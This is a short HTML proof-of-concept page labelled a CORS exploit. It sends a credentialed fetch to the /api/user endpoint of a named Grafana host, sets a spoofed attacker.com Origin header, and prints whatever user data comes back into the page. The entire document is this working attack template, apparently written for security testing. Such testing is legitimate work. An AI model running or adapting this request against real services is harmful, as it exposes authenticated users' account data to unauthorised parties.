
<!DOCTYPE html>
<html>
  <head>
    <title>CORS Exploit PoC</title>
  </head>
  <body>
    <h1>CORS Exploit Test</h1>
    <button onclick="exploit()">Send CORS Request</button>

    <script>
      function exploit() {
        fetch("https://grafana.deribit.com/api/user", {
          credentials: "include",
          headers: {
            Origin: "https://attacker.com"
          }
        })
        .then(response => response.text())
        .then(data => {
          document.body.innerHTML += "<pre>" + data + "</pre>";
        })
        .catch(error => console.error("Error:", error));
      }
    </script>
  </body>
</html>
